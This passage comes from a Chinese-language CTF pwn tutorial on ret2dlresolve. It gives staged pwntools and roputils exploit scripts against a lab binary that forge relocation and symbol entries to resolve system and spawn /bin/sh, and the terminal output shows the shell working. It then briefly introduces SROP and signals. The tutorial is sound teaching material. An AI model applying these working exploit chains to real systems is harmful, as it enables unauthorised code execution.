....@...........\n```\n\n这里给出的其实是小端模式，因此我们需要手工转换。此外，每个符号占用的大小为16个字节。\n\n```python\nfrom pwn import *\nelf = ELF('main')\nr = process('./main')\nrop = ROP('./main')\noffset = 112\nbss_addr = elf.bss()\nr.recvuntil('Welcome to XDCTF2015~!\\n')\n## stack privot to bss segment\n## new stack size is 0x800\nstack_size = 0x800\nbase_stage = bss_addr + stack_size\n### padding\nrop.raw('a' * offset)\n### read 100 byte to base_stage\nrop.read(0, base_stage, 100)\n### stack privot, set esp = base_stage\nrop.migrate(base_stage)\nr.sendline(rop.chain())\n## write sh=\"/bin/sh\"\nrop = ROP('./main')\nsh = \"/bin/sh\"\nplt0 = elf.get_section_by_name('.plt').header.sh_addr\nrel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr\ndynsym = elf.get_section_by_name('.dynsym').header.sh_addr\ndynstr = elf.get_section_by_name('.dynstr').header.sh_addr\n### making fake write symbol\nfake_sym_addr = base_stage + 32\nalign = 0x10 - ((fake_sym_addr - dynsym) & 0xf\n                )  # since the size of item(Elf32_Symbol) of dynsym is 0x10\nfake_sym_addr = fake_sym_addr + align\nindex_dynsym = (\n    fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write\nfake_write_sym = flat([0x4c, 0, 0, 0x12])\n### making fake write relocation\n## making base_stage+24 ---> fake reloc\nindex_offset = base_stage + 24 - rel_plt\nwrite_got = elf.got['write']\nr_info = (index_dynsym << 8) | 0x7\nfake_write_reloc = flat([write_got, r_info])\nrop.raw(plt0)\nrop.raw(index_offset)\n## fake ret addr of write\nrop.raw('bbbb')\nrop.raw(1)\nrop.raw(base_stage + 80)\nrop.raw(len(sh))\nrop.raw(fake_write_reloc)  # fake write reloc\nrop.raw('a' * align)  # padding\nrop.raw(fake_write_sym)  # fake write symbol\nrop.raw('a' * (80 - len(rop.chain())))\nrop.raw(sh)\nrop.raw('a' * (100 - len(rop.chain())))\nr.sendline(rop.chain())\nr.interactive()\n```\n\n具体效果如下\n\n```assembly\n➜  ret2dlresolve git:(master) ✗ python stage4.py\n[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n[+] Starting local process './main': pid 128795\n[*] Loaded cached gadgets for './main'\n[*] Switching to interactive mode\n/bin/sh[*] Got EOF while reading in interactive\n```\n\n**stage 5**\n\n这一阶段，我们将在阶段4的基础上，我们进一步使得write符号的st_name指向我们自己构造的字符串。\n\n```python\nfrom pwn import *\nelf = ELF('main')\nr = process('./main')\nrop = ROP('./main')\noffset = 112\nbss_addr = elf.bss()\nr.recvuntil('Welcome to XDCTF2015~!\\n')\n## stack privot to bss segment\n## new stack size is 0x800\nstack_size = 0x800\nbase_stage = bss_addr + stack_size\n### padding\nrop.raw('a' * offset)\n### read 100 byte to base_stage\nrop.read(0, base_stage, 100)\n### stack privot, set esp = base_stage\nrop.migrate(base_stage)\nr.sendline(rop.chain())\n## write sh=\"/bin/sh\"\nrop = ROP('./main')\nsh = \"/bin/sh\"\nplt0 = elf.get_section_by_name('.plt').header.sh_addr\nrel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr\ndynsym = elf.get_section_by_name('.dynsym').header.sh_addr\ndynstr = elf.get_section_by_name('.dynstr').header.sh_addr\n### making fake write symbol\nfake_sym_addr = base_stage + 32\nalign = 0x10 - ((fake_sym_addr - dynsym) & 0xf\n                )  # since the size of item(Elf32_Symbol) of dynsym is 0x10\nfake_sym_addr = fake_sym_addr + align\nindex_dynsym = (\n    fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write\n## plus 10 since the size of Elf32_Sym is 16.\nst_name = fake_sym_addr + 0x10 - dynstr\nfake_write_sym = flat([st_name, 0, 0, 0x12])\n### making fake write relocation\n## making base_stage+24 ---> fake reloc\nindex_offset = base_stage + 24 - rel_plt\nwrite_got = elf.got['write']\nr_info = (index_dynsym << 8) | 0x7\nfake_write_reloc = flat([write_got, r_info])\nrop.raw(plt0)\nrop.raw(index_offset)\n## fake ret addr of write\nrop.raw('bbbb')\nrop.raw(1)\nrop.raw(base_stage + 80)\nrop.raw(len(sh))\nrop.raw(fake_write_reloc)  # fake write reloc\nrop.raw('a' * align)  # padding\nrop.raw(fake_write_sym)  # fake write symbol\nrop.raw('write\\x00')  # there must be a \\x00 to mark the end of string\nrop.raw('a' * (80 - len(rop.chain())))\nrop.raw(sh)\nrop.raw('a' * (100 - len(rop.chain())))\nr.sendline(rop.chain())\nr.interactive()\n```\n\n效果如下\n\n```assembly\n➜  ret2dlresolve git:(master) ✗ python stage5.py      \n[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n[+] Starting local process './main': pid 129249\n[*] Loaded cached gadgets for './main'\n[*] Switching to interactive mode\n/bin/sh[*] Got EOF while reading in interactive\n```\n\n**stage 6**\n\n这一阶段，我们只需要将原先的write字符串修改为system字符串，同时修改write的参数为system的参数即可获取shell。这是因为，dl_resolve最终依赖的是我们所给定的字符串，即使我们给了一个假的字符串它仍然会去解析并执行。具体代码如下\n\n```python\nfrom pwn import *\nelf = ELF('main')\nr = process('./main')\nrop = ROP('./main')\noffset = 112\nbss_addr = elf.bss()\nr.recvuntil('Welcome to XDCTF2015~!\\n')\n## stack privot to bss segment\n## new stack size is 0x800\nstack_size = 0x800\nbase_stage = bss_addr + stack_size\n### padding\nrop.raw('a' * offset)\n### read 100 byte to base_stage\nrop.read(0, base_stage, 100)\n### stack privot, set esp = base_stage\nrop.migrate(base_stage)\nr.sendline(rop.chain())\n## write sh=\"/bin/sh\"\nrop = ROP('./main')\nsh = \"/bin/sh\"\nplt0 = elf.get_section_by_name('.plt').header.sh_addr\nrel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr\ndynsym = elf.get_section_by_name('.dynsym').header.sh_addr\ndynstr = elf.get_section_by_name('.dynstr').header.sh_addr\n### making fake write symbol\nfake_sym_addr = base_stage + 32\nalign = 0x10 - ((fake_sym_addr - dynsym) & 0xf\n                )  # since the size of item(Elf32_Symbol) of dynsym is 0x10\nfake_sym_addr = fake_sym_addr + align\nindex_dynsym = (\n    fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write\n## plus 10 since the size of Elf32_Sym is 16.\nst_name = fake_sym_addr + 0x10 - dynstr\nfake_write_sym = flat([st_name, 0, 0, 0x12])\n### making fake write relocation\n## making base_stage+24 ---> fake reloc\nindex_offset = base_stage + 24 - rel_plt\nwrite_got = elf.got['write']\nr_info = (index_dynsym << 8) | 0x7\nfake_write_reloc = flat([write_got, r_info])\nrop.raw(plt0)\nrop.raw(index_offset)\n## fake ret addr of write\nrop.raw('bbbb')\nrop.raw(base_stage + 82)\nrop.raw('bbbb')\nrop.raw('bbbb')\nrop.raw(fake_write_reloc)  # fake write reloc\nrop.raw('a' * align)  # padding\nrop.raw(fake_write_sym)  # fake write symbol\nrop.raw('system\\x00')  # there must be a \\x00 to mark the end of string\nrop.raw('a' * (80 - len(rop.chain())))\nprint rop.dump()\nprint len(rop.chain())\nrop.raw(sh + '\\x00')\nrop.raw('a' * (100 - len(rop.chain())))\nr.sendline(rop.chain())\nr.interactive()\n```\n\n需要注意的是，这里我'/bin/sh'的偏移我修改为了82，这是因为pwntools中它会自动帮你对齐字符串。。。下面这一行说明了问题。\n\n0x0050:      'aara'\n\n效果如下\n\n```python\n➜  ret2dlresolve git:(master) ✗ python stage6.py\n[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n[+] Starting local process './main': pid 130415\n[*] Loaded cached gadgets for './main'\n0x0000:        0x8048380\n0x0004:           0x2528\n0x0008:           'bbbb' 'bbbb'\n0x000c:        0x804a892\n0x0010:           'bbbb' 'bbbb'\n0x0014:           'bbbb' 'bbbb'\n0x0018: '\\x1c\\xa0\\x04\\x08' '\\x1c\\xa0\\x04\\x08\\x07i\\x02\\x00'\n0x001c:  '\\x07i\\x02\\x00'\n0x0020:           'aaaa' 'aaaaaaaa'\n0x0024:           'aaaa'\n0x0028:  '\\x00&\\x00\\x00' '\\x00&\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x12\\x00\\x00\\x00'\n0x002c: '\\x00\\x00\\x00\\x00'\n0x0030: '\\x00\\x00\\x00\\x00'\n0x0034: '\\x12\\x00\\x00\\x00'\n0x0038:           'syst' 'system\\x00'\n0x003c:        'em\\x00o'\n0x0040:             'aa'\n0x0044:           'aaaa' 'aaaaaaaaaaaaaa'\n0x0048:           'aaaa'\n0x004c:           'aaaa'\n0x0050:           'aara'\n82\n[*] Switching to interactive mode\n/bin/sh: 1: xa: not found\n$ ls\ncore  main.c     stage2.py  stage4.py  stage6.py\nmain  stage1.py  stage3.py  stage5.py\n```\n\n**工具攻击**\n\n根据上面的介绍，我们应该很容易可以理解这个攻击了。下面我们直接使用roputil来进行攻击。代码如下\n\n```python\nfrom roputils import *\nfrom pwn import process\nfrom pwn import gdb\nfrom pwn import context\nr = process('./main')\ncontext.log_level = 'debug'\nr.recv()\nrop = ROP('./main')\noffset = 112\nbss_base = rop.section('.bss')\nbuf = rop.fill(offset)\nbuf += rop.call('read', 0, bss_base, 100)\n## used to call dl_Resolve()\nbuf += rop.dl_resolve_call(bss_base + 20, bss_base)\nr.send(buf)\nbuf = rop.string('/bin/sh')\nbuf += rop.fill(20, buf)\n## used to make faking data, such relocation, Symbol, Str\nbuf += rop.dl_resolve_data(bss_base + 20, 'system')\nbuf += rop.fill(100, buf)\nr.send(buf)\nr.interactive()\n```\n\n关于dl_resolve_call与dl_resolve_data的具体细节请参考roputils.py的源码，比较容易理解，需要注意的是，dl_resolve执行完之后也是需要有对应的返回地址的。\n\n效果如下\n\n```assembly\n➜  ret2dlresolve git:(master) ✗ python roptool.py                       \n[+] Starting local process './main': pid 6114\n[DEBUG] Received 0x17 bytes:\n    'Welcome to XDCTF2015~!\\n'\n[DEBUG] Sent 0x94 bytes:\n    00000000  46 4c 68 78  52 36 67 6e  65 47 53 58  71 77 51 49  │FLhx│R6gn│eGSX│qwQI│\n    00000010  32 43 6c 49  77 76 51 33  47 49 4a 59  50 74 6c 38  │2ClI│wvQ3│GIJY│Ptl8│\n    00000020  57 54 68 4a  63 48 39 62  46 55 52 58  50 73 38 64  │WThJ│cH9b│FURX│Ps8d│\n    00000030  72 4c 38 63  50 79 37 73  55 45 7a 32  6f 59 5a 42  │rL8c│Py7s│UEz2│oYZB│\n    00000040  76 59 32 43  74 75 77 6f  70 56 61 44  6a 73 35 6b  │vY2C│tuwo│pVaD│js5k│\n    00000050  41 77 78 77  49 72 7a 49  70 4d 31 67  52 6f 44 6f  │Awxw│IrzI│pM1g│RoDo│\n    00000060  43 44 43 6e  45 31 50 48  53 73 64 30  6d 54 7a 5a  │CDCn│E1PH│Ssd0│mTzZ│\n    00000070  a0 83 04 08  19 86 04 08  00 00 00 00  40 a0 04 08  │····│····│····│@···│\n    00000080  64 00 00 00  80 83 04 08  28 1d 00 00  79 83 04 08  │d···│····│(···│y···│\n    00000090  40 a0 04 08                                         │@···││\n    00000094\n[DEBUG] Sent 0x64 bytes:\n    00000000  2f 62 69 6e  2f 73 68 00  73 52 46 66  57 43 59 52  │/bin│/sh·│sRFf│WCYR│\n    00000010  66 4c 35 52  78 49 4c 53  54 a0 04 08  07 e9 01 00  │fL5R│xILS│T···│····│\n    00000020  6e 6b 45 32  52 76 73 6c  00 1e 00 00  00 00 00 00  │nkE2│Rvsl│····│····│\n    00000030  00 00 00 00  12 00 00 00  73 79 73 74  65 6d 00 74  │····│····│syst│em·t│\n    00000040  5a 4f 4e 6c  6c 73 4b 5a  76 53 48 6e  38 37 49 47  │ZONl│lsKZ│vSHn│87IG│\n    00000050  69 49 52 6c  50 44 38 67  45 77 75 6c  72 47 6f 67  │iIRl│PD8g│Ewul│rGog│\n    00000060  55 41 52 4f                                         │UARO││\n    00000064\n[*] Switching to interactive mode\n$ ls\n[DEBUG] Sent 0x3 bytes:\n    'ls\\n'\n[DEBUG] Received 0x8d bytes:\n    'core\\t     main    roptool.py   roputils.pyc\\tstage2.py  stage4.py  stage6.py\\n'\n    '__init__.py  main.c  roputils.py  stage1.py\\tstage3.py  stage5.py\\n'\ncore         main    roptool.py   roputils.pyc    stage2.py  stage4.py  stage6.py\n__init__.py  main.c  roputils.py  stage1.py    stage3.py  stage5.py\n```\n\n**SROP**\n\nSROP(Sigreturn Oriented Programming)于2014年被Vrije Universiteit Amsterdam的Erik Bosman提出，其相关研究**Framing Signals — A Return to Portable Shellcode**发表在安全顶级会SP2014上，被评选为当年的Best Student Papers。\n\n**signal机制**\n\nsignal机制是类unix系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用kill来发送软中断信号。一般来说，信号机制常见的步骤如下图所示\n\n![Process of Signal Handlering](data:image/png;base64,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0m8yuGV4y+i2cbfJuBnKXNzCwfKgVbP1nK2gnYd9ucOoE79zkEuTG26Po/spj07PAXK7V413lk+gr42fkb9zQFrgvWDqEK/QtnD2iKTIt9E6MTVxNPERCY+T+JLj9vbvJ6WcT+VIK8zAH0zOnMsiZ0/kJh2RyUMde1twrTCuWOHEt5JrpbHlqqd/na2qlDtXfv5TlUh1wMWrtSyXyq6o132+WnJd5UZfI7lptaWy1boN3K65a3Zvof1Mh9dD1Ud8PejHT57EPcX25zwjPK8c9Bg2fxXypvrtpzGeCav3qR/vTLPMHvsiPP/ke+Hy4RXjVbm10+vvfy/sxH/zSwUtsvr5gARQBLrACrgjsd+HrPwK0AAegVFk3RMgYUgL2gMlQ6XQbWgcRYlEnYwqQvXDTLAvfBvNiT6AnsE4Y55gdbG3ceq4+xRmFG8po/E0+KtUDgSY0EwdSZQl/qTppC2hi6V3ZjBmNGGyZjZhUWIVYyOxe3AkcsZweXHb8VjwmvOZ85sJmAvaCHkIR4scEa0VeyQ+vYtaUknKT/qUzJAcu7yPQj1pVclK+Ylq9m5nDYzmMa01HVPddCSCzQZthneM+oxXTU3NmiykLC9bS9k02enaDzmGOuNdLrs5uNN5Unl5+Lj6vvdXC8gN/BhsE9IbZh7+LNI1aiomOY47fjTxYfK9feUp9gd+pVVkOGTyHJrPvp17+IhfnmE+W8HjQr+i5RPpJXSnKssUy5+c8auAKsvOK18YrI6t4ah9dDmlzvCq9HWDhpSmypa8Vuc2ltvDd0vvOz/AdVx4qNB1q1u/Z7g3oU+6Hx6Yfz41ODCc/0rkdfmb32/1R3PePR6nmbCfPPt++qPsp+Cps9OPZmbmMJ85v8h81Zt3XCB/8/lutci/uLR0ZJlzufaHyo9TP1Z+Ov5sWmFeiVppWln9pfUr41f3KnHVdvXEav8axZrWWsLatbXpdb515/WC9Z719d+yv31+n/j9+PfvDdkN342TG72b8Y/2k5fbOj4ggg4AmNGNje/CAOAKAFjP39hYrdzYWD+HFBsjANwL2f62s3XW0AJQtvmNB/Twlf7HN5b/AtcUxWANE+FfAAABnWlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iWE1QIENvcmUgNS40LjAiPgogICA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPgogICAgICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIgogICAgICAgICAgICB4bWxuczpleGlmPSJodHRwOi8vbnMuYWRvYmUuY29tL2V4aWYvMS4wLyI+CiAgICAgICAgIDxleGlmOlBpeGVsWERpbWVuc2lvbj44MTY8L2V4aWY6UGl4ZWxYRGltZW5zaW9uPgogICAg